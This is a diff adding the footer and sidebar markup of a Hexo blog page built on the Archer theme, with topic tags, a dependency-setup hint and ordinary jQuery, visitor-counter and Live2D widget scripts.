+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="安恒月赛"><span class="iconfont-archer">&#xe606;</span>安恒月赛</span>
+    
+        <span class="sidebar-tag-name" data-tags="Mysql"><span class="iconfont-archer">&#xe606;</span>Mysql</span>
+    
+        <span class="sidebar-tag-name" data-tags="信息收集"><span class="iconfont-archer">&#xe606;</span>信息收集</span>
+    
+        <span class="sidebar-tag-name" data-tags="Java"><span class="iconfont-archer">&#xe606;</span>Java</span>
+    
+        <span class="sidebar-tag-name" data-tags="PWN"><span class="iconfont-archer">&#xe606;</span>PWN</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞挖掘"><span class="iconfont-archer">&#xe606;</span>漏洞挖掘</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "float"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    <script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+
